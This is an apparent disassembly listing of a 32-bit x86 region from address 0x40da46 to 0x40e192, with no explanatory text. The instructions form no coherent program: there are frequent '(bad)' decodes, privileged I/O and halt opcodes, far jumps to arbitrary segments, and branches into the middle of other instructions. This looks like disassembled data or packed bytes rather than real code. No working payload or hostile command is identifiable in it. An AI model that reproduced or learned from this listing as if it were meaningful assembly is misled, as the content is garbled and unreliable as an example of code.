  40da46:	fucomi st,st(3)
  40da48:	mov    WORD PTR [ebp+0x1256900b],fs
  40da4e:	inc    ebx
  40da4f:	push   ss
  40da50:	fmul   QWORD PTR [edx]
  40da52:	or     eax,0x1e300c31
  40da57:	jmp    0x40da43
  40da59:	inc    edi
  40da5a:	dec    edx
  40da5b:	cmp    ebp,esp
  40da5d:	lds    ebp,FWORD PTR [edi+0x20]
  40da60:	sti    
  40da61:	xchg   ebx,eax
  40da62:	push   ecx
  40da63:	jle    0x40d9fd
  40da65:	or     al,0x88
  40da67:	in     al,0x9e
  40da69:	xor    BYTE PTR [edi-0x13],bl
  40da6c:	mov    BYTE PTR [edx],al
  40da6e:	das    
  40da6f:	test   eax,0xf118a508
  40da74:	mov    ecx,0xaff2724d
  40da79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da7a:	mov    ebx,0x641b91c7
  40da7f:	jne    0x40da0a
  40da81:	push   cs
  40da82:	cmc    
  40da83:	into   
  40da84:	ret    0x4f5f
  40da87:	sbb    al,0xc2
  40da89:	fsub   DWORD PTR [eax-0x12774bd]
  40da8f:	in     eax,dx
  40da90:	fstp   TBYTE PTR [edx-0x4]
  40da93:	jnp    0x40dae3
  40da95:	adc    bl,BYTE PTR [esi+0x5f79ecb0]
  40da9b:	sbb    BYTE PTR [eax+ebp*2-0x3f],ah
  40da9f:	xchg   esp,eax
  40daa0:	int3   
  40daa1:	fwait
  40daa2:	sub    eax,0x733a5d0e
  40daa7:	mov    cl,BYTE PTR [ebp+0xe836141]
  40daad:	das    
  40daae:	out    dx,eax
  40daaf:	cld    
  40dab0:	add    eax,0x92da2b7d
  40dab5:	or     DWORD PTR [ecx-0x6deaa55],0x61e6dd0b
  40dabf:	mov    edx,0x188c7b7b
  40dac4:	pop    ebp
  40dac5:	cmp    BYTE PTR [eax],al
  40dac7:	or     al,0xd0
  40dac9:	cmp    eax,0x6ad44652
  40dace:	retf   0x8b89
  40dad1:	scas   eax,DWORD PTR es:[edi]
  40dad2:	inc    esi
  40dad3:	and    eax,0x618c7587
  40dad8:	(bad)  
  40dad9:	mov    ebp,0xd1bed23a
  40dade:	imul   ebp,DWORD PTR [ebp+ecx*4-0x74],0x5b9c62fb
  40dae6:	lds    ebp,FWORD PTR [eax-0x13c840e]
  40daec:	jmp    0xfb9a:0x9719ab34
  40daf3:	push   ebp
  40daf4:	push   dx
  40daf6:	lds    ebx,FWORD PTR [ecx+ebp*8+0x63]
  40dafa:	sbb    ch,dh
  40dafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dafd:	sub    edi,DWORD PTR [edx+0x59]
  40db00:	sbb    BYTE PTR es:[ebp-0x2d],dl
  40db04:	mov    bh,0xe3
  40db06:	mov    bl,0xea
  40db08:	dec    esp
  40db09:	adc    BYTE PTR [eax-0x18],cl
  40db0c:	add    eax,0x570434cf
  40db11:	push   ebp
  40db12:	mov    ecx,0x8077211b
  40db17:	int    0x69
  40db19:	(bad)  
  40db1a:	mov    bh,0xd7
  40db1c:	push   0xfffffff5
  40db1e:	ins    DWORD PTR es:[edi],dx
  40db1f:	xchg   BYTE PTR [edi],ch
  40db21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db22:	adc    BYTE PTR [edi],cl
  40db24:	sbb    al,0xb9
  40db26:	(bad)  
  40db27:	mov    ds,WORD PTR [edx]
  40db29:	push   ecx
  40db2a:	hlt    
  40db2b:	stos   DWORD PTR es:[edi],eax
  40db2c:	sbb    ebx,edx
  40db2e:	sar    BYTE PTR [ebp-0x2e85bc52],cl
  40db34:	pop    edi
  40db35:	es stos DWORD PTR es:[edi],eax
  40db37:	push   0xa02ac2b9
  40db3c:	mov    esi,0x33115bf8
  40db41:	pop    esi
  40db42:	pop    es
  40db43:	add    BYTE PTR [esi+ebx*4],0x5d
  40db47:	shl    esi,0xc6
  40db4a:	lds    edx,FWORD PTR [esi-0x7735908b]
  40db50:	xlat   BYTE PTR ds:[ebx]
  40db51:	sub    BYTE PTR [ebp+0x28407280],ch
  40db57:	cld    
  40db58:	jecxz  0x40db27
  40db5a:	inc    eax
  40db5b:	repz mov ch,0x75
  40db5e:	cli    
  40db5f:	(bad)  
  40db60:	icebp  
  40db61:	push   0x2f
  40db63:	inc    esi
  40db64:	icebp  
  40db65:	mov    al,ds:0x11a57211
  40db6a:	cwde   
  40db6b:	sub    DWORD PTR [esi-0x5d],edi
  40db6e:	xchg   BYTE PTR [ebp+0x9],bl
  40db71:	or     al,0xd6
  40db73:	adc    esi,ebp
  40db75:	aaa    
  40db76:	mov    edx,0xf39d8fc8
  40db7b:	out    dx,al
  40db7c:	mov    ecx,0xd101c317
  40db81:	cmp    al,0x9
  40db83:	xchg   BYTE PTR [ebx-0x48219d49],ah
  40db89:	imul   DWORD PTR [esi-0x33b7fe07]
  40db8f:	loope  0x40dc05
  40db91:	xchg   esp,eax
  40db92:	adc    dh,al
  40db94:	jecxz  0x40db7a
  40db96:	aam    0x14
  40db98:	ret    
  40db99:	jge    0x40db1d
  40db9b:	sbb    eax,0x5342eb30
  40dba0:	(bad)  
  40dba2:	mov    eax,ds:0x4c3ff1af
  40dba7:	mov    bl,0xcc
  40dba9:	xor    DWORD PTR [ebx],edi
  40dbab:	int    0x0
  40dbad:	xchg   BYTE PTR ds:0x321b331c,dh
  40dbb3:	xchg   ebx,eax
  40dbb4:	pop    ebx
  40dbb5:	mov    bl,0xaa
  40dbb7:	sbb    DWORD PTR [edi-0xeb37340],0xbe91ef2b
  40dbc1:	fcomi  st,st(3)
  40dbc3:	test   eax,0x529be7f3
  40dbc8:	push   es
  40dbc9:	or     al,0x67
  40dbcb:	xor    ecx,esp
  40dbcd:	imul   esp,DWORD PTR [ebp-0x61],0x98a299e1
  40dbd4:	cmp    eax,0x507e9e57
  40dbd9:	arpl   WORD PTR [ecx],dx
  40dbdb:	adc    edi,DWORD PTR [ebx-0x4da23933]
  40dbe1:	sub    ecx,edx
  40dbe3:	(bad)  
  40dbe4:	push   ecx
  40dbe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbe6:	fld    DWORD PTR [edi+0x31b7f9b7]
  40dbec:	pop    ebx
  40dbed:	jecxz  0x40dc18
  40dbef:	pop    ebx
  40dbf0:	std    
  40dbf1:	cmp    dl,bh
  40dbf3:	test   al,0x46
  40dbf5:	xor    esi,edi
  40dbf7:	aaa    
  40dbf8:	mov    dl,0x8a
  40dbfa:	je     0x40dc4c
  40dbfc:	mov    ebx,0x6df40d36
  40dc01:	pop    ss
  40dc02:	inc    eax
  40dc03:	mov    edi,0x3dfea33c
  40dc08:	and    ah,bh
  40dc0a:	or     eax,0x2aa02c3b
  40dc0f:	ja     0x40db9e
  40dc11:	inc    ebx
  40dc12:	fcmovb st,st(0)
  40dc14:	loop   0x40dc87
  40dc16:	dec    edx
  40dc17:	fcmovnb st,st(4)
  40dc19:	cs gs mov edx,0x2a641a2f
  40dc20:	std    
  40dc21:	push   eax
  40dc22:	test   DWORD PTR [esi-0x7d8e7456],esp
  40dc28:	je     0x40dc04
  40dc2a:	or     DWORD PTR [ecx-0x3a216a1a],ebp
  40dc30:	adc    BYTE PTR [esi*8-0x21080528],dh
  40dc37:	push   0x7
  40dc39:	xchg   ebp,eax
  40dc3a:	cmp    BYTE PTR [ebp-0x5d],dh
  40dc3d:	xchg   esp,eax
  40dc3e:	add    esi,edx
  40dc40:	adc    edx,DWORD PTR [edx-0x32f712ad]
  40dc46:	jmp    0xbac6a53a
  40dc4b:	or     eax,0x281fc550
  40dc50:	adc    eax,0x5b821fbe
  40dc55:	bound  edx,QWORD PTR [eax-0x6d]
  40dc58:	pop    esi
  40dc59:	jle    0x40dc32
  40dc5b:	xor    DWORD PTR [ebx+0x4264b536],eax
  40dc61:	adc    DWORD PTR [ebx+0x35],edx
  40dc64:	sbb    BYTE PTR [edx-0x1a4529e2],dh
  40dc6a:	dec    esi
  40dc6b:	and    bl,BYTE PTR [edi]
  40dc6d:	push   eax
  40dc6e:	shr    ebx,cl
  40dc70:	jecxz  0x40dcba
  40dc72:	popf   
  40dc73:	or     esi,DWORD PTR [esi]
  40dc75:	out    dx,eax
  40dc76:	(bad)  
  40dc77:	cmp    BYTE PTR [eax],bh
  40dc79:	mov    ah,0x63
  40dc7b:	mov    ch,0x2e
  40dc7d:	jl     0x40dccb
  40dc7f:	clc    
  40dc80:	in     eax,dx
  40dc81:	mov    BYTE PTR [edx-0x80],al
  40dc84:	je     0x40dc26
  40dc86:	in     al,0xb2
  40dc88:	or     BYTE PTR [ebx-0x5fcdcf16],ah
  40dc8e:	sbb    eax,0xdd8af506
  40dc93:	or     BYTE PTR [ebx+0x65],dl
  40dc96:	xor    al,0xee
  40dc98:	imul   cl
  40dc9a:	into   
  40dc9b:	pop    esi
  40dc9c:	pop    es
  40dc9d:	lods   al,BYTE PTR ds:[esi]
  40dc9e:	xor    eax,0x5a75166c
  40dca3:	or     ch,dh
  40dca5:	mov    ds:0x1c487361,al
  40dcaa:	mov    edx,0x81ba8334
  40dcaf:	inc    edi
  40dcb0:	scas   eax,DWORD PTR es:[edi]
  40dcb1:	(bad)  
  40dcb2:	or     al,0x53
  40dcb4:	loop   0x40dc3c
  40dcb6:	hlt    
  40dcb7:	jne    0x40dceb
  40dcb9:	push   esp
  40dcba:	es pop ebp
  40dcbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcbd:	mov    dh,0x38
  40dcbf:	in     eax,dx
  40dcc0:	out    0xa9,al
  40dcc2:	xchg   ecx,eax
  40dcc3:	or     DWORD PTR [ebp+eiz*8+0x12],0xffffffb0
  40dcc8:	sbb    ecx,DWORD PTR [edi-0x5bac6edb]
  40dcce:	push   edi
  40dccf:	adc    eax,ecx
  40dcd1:	inc    edx
  40dcd2:	jmp    0xd354:0x91e9f5f9
  40dcd9:	add    cl,BYTE PTR [edx-0x2b]
  40dcdc:	add    eax,0x53e159c3
  40dce1:	lock stc 
  40dce3:	mov    esi,esi
  40dce5:	rcl    DWORD PTR [ebp-0xb],1
  40dce8:	shl    DWORD PTR ds:0xedfdb3aa,1
  40dcee:	sti    
  40dcef:	lods   eax,DWORD PTR ds:[esi]
  40dcf0:	(bad)  [esi-0x36]
  40dcf3:	mov    DWORD PTR [ebx+eax*4],ebx
  40dcf6:	sbb    dl,BYTE PTR [ecx+edi*4+0x3f]
  40dcfa:	sub    dl,BYTE PTR [eax]
  40dcfc:	icebp  
  40dcfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcfe:	dec    eax
  40dcff:	mov    cl,0x64
  40dd01:	jnp    0x40dd45
  40dd03:	dec    esi
  40dd04:	lods   eax,DWORD PTR ds:[esi]
  40dd05:	gs xchg ebp,eax
  40dd07:	lds    eax,FWORD PTR gs:[ebp+0x58ff9be]
  40dd0e:	retf   0xded
  40dd11:	push   esi
  40dd12:	dec    ecx
  40dd13:	pop    eax
  40dd14:	and    al,0x61
  40dd16:	enter  0x7789,0xc5
  40dd1a:	ror    DWORD PTR [ebx-0x18],1
  40dd1d:	adc    ebx,DWORD PTR [ebx+0x49]
  40dd20:	push   ebp
  40dd21:	mov    WORD PTR [esi+0xa],ss
  40dd24:	cmp    DWORD PTR [eax-0x28],0x61
  40dd28:	push   0x41
  40dd2a:	test   BYTE PTR [eax+ebx*1-0x70],al
  40dd2e:	cdq    
  40dd2f:	nop
  40dd30:	push   ecx
  40dd31:	pushw  0xfff9
  40dd34:	rcl    BYTE PTR [ebx+0x5534e889],cl
  40dd3a:	jl     0x40dd27
  40dd3c:	xor    bh,BYTE PTR [ebx]
  40dd3e:	(bad)  
  40dd3f:	jbe    0x40dd5a
  40dd41:	xchg   ecx,eax
  40dd42:	or     edx,DWORD PTR [ecx+0x15]
  40dd45:	mov    DWORD PTR [eax-0x54],esi
  40dd48:	lock cwde 
  40dd4a:	iret   
  40dd4b:	pop    ebx
  40dd4c:	adc    ebx,DWORD PTR [esi]
  40dd4e:	mov    edi,0x78e6163e
  40dd53:	or     al,0x31
  40dd55:	call   FWORD PTR [ebx]
  40dd57:	getsec 
  40dd59:	ret    0x2aac
  40dd5c:	hlt    
  40dd5d:	mov    bl,0x4e
  40dd5f:	mov    ah,0xbd
  40dd61:	sub    cl,BYTE PTR [edi+edx*8]
  40dd64:	and    eax,DWORD PTR [ebx+ebp*2-0x41ef1632]
  40dd6b:	add    esp,edx
  40dd6d:	dec    esp
  40dd6e:	mov    dh,0x72
  40dd70:	mov    DWORD PTR [ecx+0x79],ebx
  40dd73:	xchg   esp,eax
  40dd74:	pusha  
  40dd75:	jecxz  0x40dde3
  40dd77:	xchg   DWORD PTR [ebx+0x5c10d537],esp
  40dd7d:	mov    ebp,0x961e571e
  40dd82:	xor    al,0x30
  40dd84:	xor    BYTE PTR [esi],dl
  40dd86:	push   0x9f6b96a2
  40dd8b:	(bad)  
  40dd8c:	sub    al,0x45
  40dd8e:	fwait
  40dd8f:	xlat   BYTE PTR ds:[ebx]
  40dd90:	scas   eax,DWORD PTR es:[edi]
  40dd91:	xlat   BYTE PTR ds:[ebx]
  40dd92:	iret   
  40dd93:	imul   eax,DWORD PTR [ecx+0x356da6c4],0x3
  40dd9a:	sbb    esi,edi
  40dd9c:	mov    al,0xee
  40dd9e:	hlt    
  40dd9f:	outs   dx,DWORD PTR ds:[esi]
  40dda0:	or     eax,0x36240c66
  40dda5:	xchg   DWORD PTR [edx-0x570b87df],eax
  40ddab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddac:	hlt    
  40ddad:	call   0xdafe8c07
  40ddb2:	push   edx
  40ddb3:	aas    
  40ddb4:	fistp  DWORD PTR [edi]
  40ddb6:	mov    ebx,0x6882a368
  40ddbb:	fabs   
  40ddbd:	shl    BYTE PTR [eax-0x30ef80c0],1
  40ddc3:	popf   
  40ddc4:	or     edi,DWORD PTR [edi]
  40ddc6:	push   ax
  40ddc8:	out    dx,al
  40ddc9:	adc    DWORD PTR ds:0x67a91994,ebx
  40ddcf:	jb     0x40dd9c
  40ddd1:	dec    edi
  40ddd2:	pop    ds
  40ddd3:	lock jb 0x40de13
  40ddd6:	fcmovnu st,st(4)
  40ddd8:	ins    DWORD PTR es:[edi],dx
  40ddd9:	sbb    eax,0x9923f3e
  40ddde:	jmp    0xce15:0x80c7b4f8
  40dde5:	pop    ecx
  40dde6:	xor    al,BYTE PTR [ebp+0x5af19434]
  40ddec:	adc    al,0x6b
  40ddee:	jg     0x40ddee
  40ddf0:	cmp    DWORD PTR [eax-0x3],esi
  40ddf3:	sahf   
  40ddf4:	test   al,0x92
  40ddf6:	mov    al,0xdd
  40ddf8:	xlat   BYTE PTR ds:[ebx]
  40ddf9:	fiadd  DWORD PTR [edx+0x19]
  40ddfc:	add    DWORD PTR [edi],esi
  40ddfe:	shl    BYTE PTR [ecx+0x4bfa9384],0x71
  40de05:	xor    DWORD PTR [edx],esi
  40de07:	hlt    
  40de08:	in     al,dx
  40de09:	icebp  
  40de0a:	add    DWORD PTR [edx+0x49],eax
  40de0d:	inc    edx
  40de0e:	test   DWORD PTR [esi],0x39cc3fa6
  40de14:	pop    esi
  40de15:	pop    eax
  40de16:	mov    ch,0xda
  40de18:	push   esi
  40de19:	bound  esi,QWORD PTR [edi+0x73]
  40de1c:	sti    
  40de1d:	cli    
  40de1e:	out    0x98,al
  40de20:	je     0x40de4a
  40de22:	mov    ds:0x2a1c5aa,eax
  40de27:	adc    esp,DWORD PTR [edi]
  40de29:	nop
  40de2a:	call   0x950656b5
  40de2f:	cli    
  40de30:	and    dh,bh
  40de32:	arpl   WORD PTR [ebp+0x57],si
  40de35:	ret    0xc5b4
  40de38:	stc    
  40de39:	(bad)  
  40de3a:	pop    esi
  40de3b:	push   edi
  40de3c:	sbb    edx,DWORD PTR [ebx-0x74a1fa33]
  40de42:	cmc    
  40de43:	(bad)  
  40de44:	rol    DWORD PTR [esi-0x46],1
  40de47:	jmp    0x40de99
  40de49:	fwait
  40de4a:	fwait
  40de4b:	loope  0x40ddf6
  40de4d:	mov    ds:0xa5b66311,eax
  40de52:	xchg   ecx,eax
  40de53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de54:	cdq    
  40de55:	sub    BYTE PTR [eax],0xc8
  40de58:	cmc    
  40de59:	aam    0x11
  40de5b:	jae    0x40de2a
  40de5d:	sbb    BYTE PTR [edx],ah
  40de5f:	mov    sp,bp
  40de62:	ss inc ecx
  40de64:	xchg   ecx,eax
  40de65:	pop    edx
  40de66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de67:	push   ds
  40de68:	push   ecx
  40de69:	repz dec esi
  40de6b:	gs (bad) 
  40de6d:	xlat   BYTE PTR ds:[ebx]
  40de6e:	das    
  40de6f:	pop    edi
  40de70:	sub    eax,0xec7dc7f1
  40de75:	call   0xb32f:0x3c3b6ff5
  40de7c:	(bad)  
  40de7d:	dec    esi
  40de7e:	mov    ah,0x57
  40de80:	gs mov ecx,0x7bbc3844
  40de86:	dec    BYTE PTR [bx+si-0x3561]
  40de8b:	(bad)  
  40de8c:	outs   dx,BYTE PTR ds:[esi]
  40de8d:	shr    DWORD PTR [edi],cl
  40de8f:	out    0xd6,eax
  40de91:	icebp  
  40de92:	mov    edx,0x7740869d
  40de97:	sbb    DWORD PTR [ebx-0xc],0xffffffef
  40de9b:	scas   al,BYTE PTR es:[edi]
  40de9c:	jge    0x40debb
  40de9e:	or     ecx,DWORD PTR [ebx]
  40dea0:	aam    0x5d
  40dea2:	sub    DWORD PTR [edx],0x5d85a30a
  40dea8:	pop    ss
  40dea9:	xchg   ecx,eax
  40deaa:	lods   al,BYTE PTR ds:[esi]
  40deab:	les    esi,FWORD PTR cs:[edx-0x5f1c3fcf]
  40deb2:	cmp    ebx,DWORD PTR [eax]
  40deb4:	xchg   BYTE PTR [ecx-0x2564b472],ah
  40deba:	mov    ds:0xecde6c83,eax
  40debf:	ss sbb eax,0xc91d9636
  40dec5:	adc    BYTE PTR [ebp+0x98978ed],bh
  40decb:	ret    0xe1b
  40dece:	inc    esp
  40decf:	mov    al,ds:0x8571427c
  40ded4:	test   eax,0xfe73e9a0
  40ded9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deda:	mov    edx,0xacf9a73e
  40dedf:	loopne 0x40df56
  40dee1:	test   al,0x3a
  40dee3:	inc    edi
  40dee4:	jb     0x40df0d
  40dee6:	mov    cl,0xc7
  40dee8:	imul   esi,ecx,0x78acbe7b
  40deee:	adc    eax,0x5f3db432
  40def3:	xchg   ecx,eax
  40def4:	jmp    0x406208ef
  40def9:	das    
  40defa:	xor    DWORD PTR [ebp+0x54],0xd22b20c3
  40df01:	dec    ecx
  40df02:	add    dh,BYTE PTR [esi-0x3c]
  40df05:	test   edx,ebx
  40df07:	sahf   
  40df08:	add    al,0x3c
  40df0a:	cmp    al,0x27
  40df0c:	pop    ss
  40df0d:	dec    edx
  40df0e:	mov    eax,ds:0x661404a2
  40df13:	in     eax,dx
  40df14:	and    edi,DWORD PTR [ecx-0x22]
  40df17:	mov    ebp,0xd5750a6e
  40df1c:	lods   eax,DWORD PTR ds:[esi]
  40df1d:	test   BYTE PTR [eax-0x1],bh
  40df20:	popa   
  40df21:	mov    al,0xbb
  40df23:	sbb    DWORD PTR [ebx],eax
  40df25:	popa   
  40df26:	jae    0x40dfa5
  40df28:	popa   
  40df29:	test   al,0xef
  40df2b:	xor    DWORD PTR [ebp+eiz*4+0x326fa47a],edx
  40df32:	add    ebp,DWORD PTR [eax+0x688aa1d2]
  40df38:	fwait
  40df39:	ins    BYTE PTR es:[edi],dx
  40df3a:	xor    eax,0x3813dfc4
  40df3f:	mov    WORD PTR [edx-0x6b],ss
  40df42:	push   edi
  40df43:	cmp    al,dl
  40df45:	mov    esi,DWORD PTR [ebp-0x56a1f74d]
  40df4b:	xchg   edx,eax
  40df4c:	lea    ebp,[eax-0x74]
  40df4f:	aaa    
  40df50:	cs std 
  40df52:	dec    ebx
  40df53:	les    esi,FWORD PTR [ebx]
  40df55:	sbb    edx,edx
  40df57:	ss (bad) 
  40df59:	pop    ebp
  40df5a:	(bad)  
  40df5b:	ins    BYTE PTR es:[edi],dx
  40df5c:	sub    eax,0x87d37164
  40df61:	scas   eax,DWORD PTR es:[edi]
  40df62:	add    al,0x8f
  40df64:	and    dh,BYTE PTR [edx+0xa214074]
  40df6a:	(bad)  
  40df6b:	scas   eax,DWORD PTR es:[edi]
  40df6c:	cmp    DWORD PTR [ebx-0x1e],0xffffffa2
  40df70:	call   0x98a061ff
  40df75:	jmp    0x40df49
  40df77:	jp     0x40df2e
  40df79:	mov    WORD PTR [edi],gs
  40df7b:	jb     0x40df47
  40df7d:	pop    ds
  40df7e:	mov    bl,0x6c
  40df80:	retf   0xe500
  40df83:	pop    edi
  40df84:	add    DWORD PTR [esi],edi
  40df86:	dec    ebp
  40df87:	nop
  40df88:	idiv   BYTE PTR [edx+0x4d]
  40df8b:	and    ah,dh
  40df8d:	popa   
  40df8e:	jnp    0x40dfc7
  40df90:	(bad)  [ecx+ebx*8+0x4f]
  40df94:	mov    ebx,0x882916ec
  40df99:	mov    esp,0xcba0972e
  40df9e:	cmp    esp,DWORD PTR [eax]
  40dfa0:	mov    WORD PTR [ebp+edi*4-0x7f],gs
  40dfa4:	(bad)  
  40dfa5:	in     al,0x6b
  40dfa7:	jecxz  0x40dfcb
  40dfa9:	dec    ebx
  40dfaa:	mov    cl,0x33
  40dfac:	xchg   edx,eax
  40dfad:	lahf   
  40dfae:	and    BYTE PTR [esi-0x41],dh
  40dfb1:	mov    ch,0x7a
  40dfb3:	push   es
  40dfb4:	cmp    cl,bh
  40dfb6:	in     al,0x81
  40dfb8:	inc    ecx
  40dfb9:	outs   dx,DWORD PTR ds:[esi]
  40dfba:	push   esi
  40dfbb:	push   ebx
  40dfbc:	mov    al,ds:0x7e86f710
  40dfc1:	xchg   esi,eax
  40dfc2:	cmp    edx,DWORD PTR [ecx+0x552586a8]
  40dfc8:	push   esp
  40dfc9:	ins    DWORD PTR es:[edi],dx
  40dfca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfcb:	pop    ds
  40dfcc:	bound  ebx,QWORD PTR [ecx-0x4b]
  40dfcf:	jae    0x40e005
  40dfd1:	fsub   st(7),st
  40dfd3:	out    0xd8,al
  40dfd5:	or     al,0xf1
  40dfd7:	pop    ss
  40dfd8:	xor    BYTE PTR [ebp+0x59],ch
  40dfdb:	aas    
  40dfdc:	cmp    eax,0x84aa32a7
  40dfe1:	std    
  40dfe2:	xchg   ebx,eax
  40dfe3:	ins    BYTE PTR es:[edi],dx
  40dfe4:	dec    ecx
  40dfe5:	cmp    BYTE PTR [ebp-0x17],ah
  40dfe8:	push   ebp
  40dfe9:	cld    
  40dfea:	pop    ss
  40dfeb:	sub    ah,dh
  40dfed:	sub    BYTE PTR [esi+0x15],dl
  40dff0:	mov    ecx,0x97b38a2f
  40dff5:	ret    
  40dff6:	dec    ebx
  40dff7:	fnstcw WORD PTR [edx]
  40dff9:	pop    eax
  40dffa:	jg     0x40e023
  40dffc:	mov    bl,0x6e
  40dffe:	retf   0xf14a
  40e001:	rcl    DWORD PTR [ebp-0x55],0xb8
  40e005:	pop    es
  40e006:	aas    
  40e007:	push   cs
  40e008:	mov    dl,0xea
  40e00a:	lahf   
  40e00b:	jnp    0x40e039
  40e00d:	inc    ebx
  40e00e:	jmp    0xeac344bd
  40e013:	xchg   BYTE PTR [eax+0x77c2b727],al
  40e019:	mov    bh,0x7a
  40e01b:	nop
  40e01c:	ins    BYTE PTR es:[edi],dx
  40e01d:	fnstsw WORD PTR [ebp-0x1]
  40e020:	mov    al,ds:0x6b25e3af
  40e025:	inc    eax
  40e026:	cmc    
  40e027:	leave  
  40e028:	leave  
  40e029:	cmp    al,0xd1
  40e02b:	mov    dh,BYTE PTR [edx]
  40e02d:	sbb    dh,BYTE PTR [eax+0x491ab735]
  40e033:	xchg   esp,eax
  40e034:	scas   al,BYTE PTR es:[edi]
  40e035:	out    dx,eax
  40e036:	scas   al,BYTE PTR es:[edi]
  40e037:	xor    DWORD PTR [eax],edi
  40e039:	and    ch,al
  40e03b:	xchg   ecx,eax
  40e03c:	mov    ebp,0x3dc38191
  40e041:	ss and eax,0xf221659f
  40e047:	jno    0x40e0a7
  40e049:	pusha  
  40e04a:	push   edx
  40e04b:	(bad)  
  40e04c:	mov    DWORD PTR [eax],0x494a4a69
  40e052:	ins    DWORD PTR es:[edi],dx
  40e053:	ret    
  40e054:	in     eax,dx
  40e055:	sahf   
  40e056:	or     esi,DWORD PTR [esi+0x1e]
  40e059:	jno    0x40dfec
  40e05b:	sub    dh,al
  40e05d:	xor    al,0xbf
  40e05f:	push   eax
  40e060:	dec    ecx
  40e061:	fnstenv [ebp+0x501b6413]
  40e067:	add    al,0x99
  40e069:	add    eax,0x70f99f18
  40e06e:	or     DWORD PTR [ecx+0x47],ecx
  40e071:	jb     0x40e061
  40e073:	cmp    dl,BYTE PTR [edx-0x66d255ed]
  40e079:	sar    DWORD PTR [eax],1
  40e07b:	or     DWORD PTR [ebx],ebx
  40e07d:	xchg   ebp,eax
  40e07e:	or     edx,DWORD PTR [edx+0x7c]
  40e081:	lahf   
  40e082:	stc    
  40e083:	ss adc ebx,ebx
  40e086:	scas   al,BYTE PTR es:[edi]
  40e087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e088:	jae    0x40e0d1
  40e08a:	cli    
  40e08b:	pop    ss
  40e08c:	jbe    0x40e046
  40e08e:	pop    ebp
  40e08f:	rcl    al,0x76
  40e092:	loopne 0x40e04c
  40e094:	xor    eax,0x4279a578
  40e099:	pop    edx
  40e09a:	(bad)  
  40e09b:	out    0x62,eax
  40e09d:	in     eax,dx
  40e09e:	fidiv  DWORD PTR [ebp-0x294303f8]
  40e0a4:	sub    al,0xc5
  40e0a6:	push   0x3c
  40e0a8:	and    ch,bl
  40e0aa:	mov    cl,0x7f
  40e0ac:	arpl   WORD PTR [eax-0x6d8bbab8],si
  40e0b2:	pop    ds
  40e0b3:	cmp    ecx,eax
  40e0b5:	add    ebp,DWORD PTR [edx-0x16]
  40e0b8:	clc    
  40e0b9:	loopne 0x40e051
  40e0bb:	ja     0x40e100
  40e0bd:	ret    
  40e0be:	int3   
  40e0bf:	mov    DWORD PTR es:[eax],esp
  40e0c2:	sub    dl,BYTE PTR [ecx-0x29d22c20]
  40e0c8:	dec    esi
  40e0c9:	jle    0x40e107
  40e0cb:	(bad)  
  40e0cc:	lahf   
  40e0cd:	nop
  40e0ce:	jmp    0x1080cbd7
  40e0d3:	sahf   
  40e0d4:	xchg   ebx,eax
  40e0d5:	xor    ebp,ebp
  40e0d7:	popf   
  40e0d8:	in     al,0x85
  40e0da:	sahf   
  40e0db:	sbb    eax,0x380408ae
  40e0e0:	das    
  40e0e1:	pusha  
  40e0e2:	lock out 0x71,al
  40e0e5:	hlt    
  40e0e6:	dec    edi
  40e0e7:	inc    eax
  40e0e8:	and    al,0x82
  40e0ea:	jns    0x40e16a
  40e0ec:	aam    0x8d
  40e0ee:	push   esi
  40e0ef:	imul   ecx,DWORD PTR [edi-0x37],0x6
  40e0f3:	jle    0x40e0ea
  40e0f5:	mov    cl,0xd2
  40e0f7:	mov    ecx,0xd385297a
  40e0fc:	dec    edx
  40e0fd:	fbstp  TBYTE PTR ds:0xdc6d5d1a
  40e103:	adc    DWORD PTR [ecx+eax*1+0x78e2ee6d],esi
  40e10a:	cmp    al,0x65
  40e10c:	bnd ja 0x40e0ef
  40e10f:	jo     0x40e0bf
  40e111:	push   ds
  40e112:	sub    esp,DWORD PTR [eax+0x37b5cef6]
  40e118:	sub    DWORD PTR es:[esi],ebp
  40e11b:	mov    ebx,0x7fa2c238
  40e120:	mov    esp,DWORD PTR [edi+0x106d41d8]
  40e126:	stos   BYTE PTR es:[edi],al
  40e127:	xchg   edi,eax
  40e128:	cmp    DWORD PTR [esp+ebp*4-0x7daf3c8],ecx
  40e12f:	xchg   ecx,eax
  40e130:	ins    DWORD PTR es:[edi],dx
  40e131:	aad    0x20
  40e133:	out    dx,al
  40e134:	pop    eax
  40e135:	push   DWORD PTR [edx]
  40e137:	jns    0x40e120
  40e139:	xchg   esp,eax
  40e13a:	(bad)  
  40e13b:	mov    bh,0x32
  40e13d:	mov    WORD PTR [edi-0xc],?
  40e140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e141:	fsub   QWORD PTR [edi+eiz*2+0xb4d83a9]
  40e148:	jbe    0x40e1be
  40e14a:	and    bh,ah
  40e14c:	jo     0x40e10c
  40e14e:	add    eax,0xd3392e52
  40e153:	es jb  0x40e190
  40e156:	mov    esi,0xe05a21e1
  40e15b:	push   0xffffffd9
  40e15d:	xor    BYTE PTR [edi],bh
  40e15f:	int3   
  40e160:	jl     0x40e129
  40e162:	in     eax,dx
  40e163:	cli    
  40e164:	mov    dh,0xb4
  40e166:	test   DWORD PTR [eax],ecx
  40e168:	jmp    0x40e1bc
  40e16a:	in     eax,0x41
  40e16c:	dec    esp
  40e16d:	(bad)
  40e171:	icebp  
  40e172:	jmp    0x40e0ff
  40e174:	pop    ecx
  40e175:	inc    edi
  40e176:	dec    edx
  40e177:	push   ds
  40e178:	mov    cl,0xcc
  40e17a:	pusha  
  40e17b:	mov    ebx,0x6865e26a
  40e180:	jmp    0x40e157
  40e182:	jle    0x40e1ed
  40e184:	retf   
  40e185:	loopne 0x40e159
  40e187:	cwde   
  40e188:	adc    BYTE PTR [ecx+0x1f2b56e5],0xa2
  40e18f:	fadd   DWORD PTR [eax+0x29]
  40e192:	in     eax,0xed
